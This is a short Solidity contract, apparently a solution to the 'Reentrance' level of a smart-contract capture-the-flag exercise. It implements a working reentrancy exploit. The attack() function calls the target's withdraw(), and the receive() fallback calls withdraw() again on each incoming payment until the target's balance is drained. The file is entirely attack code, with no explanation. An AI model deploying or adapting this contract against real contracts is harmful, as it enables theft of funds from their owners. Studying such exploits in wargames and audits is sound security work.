// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;

interface IReentrance {
    function withdraw(uint256 _amount) external;
}

contract ReentranceAttacker {
    address public instance;
    uint256 amount;

    constructor(address _instance) public {
        instance = _instance;
    }

    function attack(uint256 _amount) public {
        amount = _amount;
        IReentrance(instance).withdraw(amount);
    }

    receive() external payable {
        if (instance.balance == 0) return;

        if (instance.balance > 0 && instance.balance <= amount) {
            IReentrance(instance).withdraw(instance.balance);
        } else {
            IReentrance(instance).withdraw(amount);
        }
    }
}
